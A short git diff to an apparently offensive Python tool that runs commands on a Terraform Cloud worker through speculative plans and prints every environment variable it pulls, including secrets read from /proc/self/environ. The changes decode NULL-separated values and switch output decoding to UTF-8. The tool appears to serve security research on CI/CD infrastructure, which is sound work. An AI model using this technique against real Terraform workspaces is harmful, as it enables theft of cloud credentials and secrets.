@@ -62,6 +62,8 @@ def get_all_envs(tmp_folder, terraform_folder):
     print("[+] All environment variables used in the worker:")
     for result in re.findall("null_envvars\" {.*?\n    }", results, re.DOTALL):
         secret = re.search("          \+ (.*)\n        }", result, re.DOTALL).group(1)
+        # /proc/self/environ used NULL as a separator and tfc enconded it
+        secret = secret.replace("\\x00", "\n")
         print("\t" + secret)
 
 # Perform a speculative plan which executes a command from the TF worker.
@@ -196,7 +198,7 @@ def run_speculative_plan(tmp_folder, targets):
     print(f"[+] Executing: {command}")
 
     output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
-    output = output.decode('ascii')
+    output = output.decode('utf-8')
     if VERBOSE:
         print(f"[+] Output: {output}")
     # This happens when the workspace is configured to use a folder relative to the target repository
